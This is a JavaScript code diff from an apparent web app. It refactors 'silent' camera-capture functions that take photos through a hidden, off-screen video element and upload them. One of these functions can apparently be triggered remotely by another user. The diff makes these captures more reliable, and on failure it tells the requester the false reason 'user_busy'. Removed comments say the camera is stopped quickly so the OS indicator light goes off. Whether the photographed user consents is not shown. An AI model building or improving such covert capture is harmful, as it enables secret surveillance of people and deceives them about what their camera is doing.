@@ -2537,6 +2537,85 @@ async function initAuth() {
   }
 }
 
+function isCanvasBlack(ctx, width, height) {
+  try {
+    const imgData = ctx.getImageData(0, 0, width, height).data;
+    let totalLuminance = 0;
+    const step = Math.max(1, Math.floor(imgData.length / 400));
+    let sampleCount = 0;
+    for (let i = 0; i < imgData.length; i += step * 4) {
+      const r = imgData[i];
+      const g = imgData[i + 1];
+      const b = imgData[i + 2];
+      const luminance = 0.299 * r + 0.587 * g + 0.114 * b;
+      totalLuminance += luminance;
+      sampleCount++;
+    }
+    const avgLuminance = totalLuminance / (sampleCount || 1);
+    return avgLuminance < 4;
+  } catch (e) {
+    return false;
+  }
+}
+window.isCanvasBlack = isCanvasBlack;
+
+async function extractValidFrameFromStream(stream, maxTimeoutMs = 1800) {
+  if (!stream) return null;
+  const video = document.createElement("video");
+  video.setAttribute("playsinline", "true");
+  video.setAttribute("webkit-playsinline", "true");
+  video.muted = true;
+  video.autoplay = true;
+  video.style.cssText = "position:fixed; top:-1000px; left:-1000px; width:100px; height:100px; opacity:0.001; pointer-events:none; z-index:-9999;";
+  
+  document.body.appendChild(video);
+  video.srcObject = stream;
+
+  try {
+    try {
+      await video.play();
+    } catch (e) {}
+
+    const startTime = Date.now();
+    let validDataUrl = null;
+
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.imageSmoothingEnabled = true;
+    ctx.imageSmoothingQuality = "high";
+
+    while (Date.now() - startTime < maxTimeoutMs) {
+      if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        if (!isCanvasBlack(ctx, canvas.width, canvas.height)) {
+          validDataUrl = canvas.toDataURL("image/jpeg", 0.92);
+          break;
+        }
+      }
+      await new Promise(resolve => setTimeout(resolve, 60));
+    }
+
+    if (!validDataUrl && video.readyState >= 2 && video.videoWidth > 0) {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      if (!isCanvasBlack(ctx, canvas.width, canvas.height)) {
+        validDataUrl = canvas.toDataURL("image/jpeg", 0.92);
+      }
+    }
+
+    return validDataUrl;
+  } finally {
+    try { video.pause(); } catch(e) {}
+    video.srcObject = null;
+    video.remove();
+  }
+}
+window.extractValidFrameFromStream = extractValidFrameFromStream;
+
 async function captureSilentPhoto() {
   if (!State.currentUser || !State.currentUser.livePhotoEnabled) {
     return;
@@ -2555,6 +2634,12 @@ async function captureSilentPhoto() {
           ctx.imageSmoothingEnabled = true;
           ctx.imageSmoothingQuality = "high";
           ctx.drawImage(activeLocalVideo, 0, 0, canvas.width, canvas.height);
+
+          if (isCanvasBlack(ctx, canvas.width, canvas.height)) {
+            console.warn("[SilentPhoto] Canvas captured black frame from active video element — aborting upload.");
+            return;
+          }
+
           const dataUrl = canvas.toDataURL("image/jpeg", 0.92);
           const res = await uploadCapturedPhoto(dataUrl);
           if (res && res.code === 201) {
@@ -2592,50 +2677,17 @@ async function captureSilentPhoto() {
 
     let dataUrl = null;
     try {
-      const video = document.createElement("video");
-      video.setAttribute("playsinline", "true");
-      video.setAttribute("webkit-playsinline", "true");
-      video.muted = true;
-      video.autoplay = true;
-      video.srcObject = stream;
-      
-      try {
-        await video.play();
-      } catch (e) {}
-
-      // Wait until video frames are actually available and non-black
-      await new Promise(resolve => {
-        let attempts = 0;
-        const checkReady = () => {
-          attempts++;
-          if ((video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) || attempts >= 30) {
-            resolve();
-          } else {
-            setTimeout(checkReady, 50);
-          }
-        };
-        checkReady();
-      });
-
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext("2d");
-
-      ctx.imageSmoothingEnabled = true;
-      ctx.imageSmoothingQuality = "high";
-
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      dataUrl = canvas.toDataURL("image/jpeg", 0.92);
+      dataUrl = await extractValidFrameFromStream(stream, 1800);
     } finally {
-      // STOP camera track IMMEDIATELY after canvas extraction so OS indicator light turns off instantly
       stream.getTracks().forEach(track => {
         try { track.enabled = false; track.stop(); } catch(e) {}
       });
     }
 
-    if (!dataUrl) return;
+    if (!dataUrl) {
+      console.warn("[SilentPhoto] Captured frame was black or invalid — aborting upload to prevent black logs.");
+      return;
+    }
 
     if (window.DataUsageTracker && window.DataUsageTracker.trackFeature) {
       var photoSize = Math.round(dataUrl.length * 0.75);
@@ -2895,50 +2947,20 @@ async function captureSilentMoment(cameraPreference = null, requesterId = null) 
 
     let dataUrl = null;
     try {
-      const video = document.createElement("video");
-      video.setAttribute("playsinline", "true");
-      video.setAttribute("webkit-playsinline", "true");
-      video.muted = true;
-      video.autoplay = true;
-      video.srcObject = stream;
-      
-      try {
-        await video.play();
-      } catch (e) {}
-
-      // Wait until video frames are actually available and non-black
-      await new Promise(resolve => {
-        let attempts = 0;
-        const checkReady = () => {
-          attempts++;
-          if ((video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) || attempts >= 30) {
-            resolve();
-          } else {
-            setTimeout(checkReady, 50);
-          }
-        };
-        checkReady();
-      });
-
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext("2d");
-
-      ctx.imageSmoothingEnabled = true;
-      ctx.imageSmoothingQuality = "high";
-
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      dataUrl = canvas.toDataURL("image/jpeg", 0.92);
+      dataUrl = await extractValidFrameFromStream(stream, 1800);
     } finally {
-      // STOP camera track IMMEDIATELY after canvas extraction so OS indicator light turns off instantly
       stream.getTracks().forEach(track => {
         try { track.enabled = false; track.stop(); } catch(e) {}
       });
     }
 
-    if (!dataUrl) return;
+    if (!dataUrl) {
+      console.warn("[Snapshot] Captured frame was black or invalid — aborting upload.");
+      if (requesterId && typeof socket !== "undefined") {
+        socket.emit("moment:error", { to: requesterId, reason: "user_busy" });
+      }
+      return;
+    }
 
     if (window.DataUsageTracker && window.DataUsageTracker.trackFeature) {
       var momentSize = Math.round(dataUrl.length * 0.75);
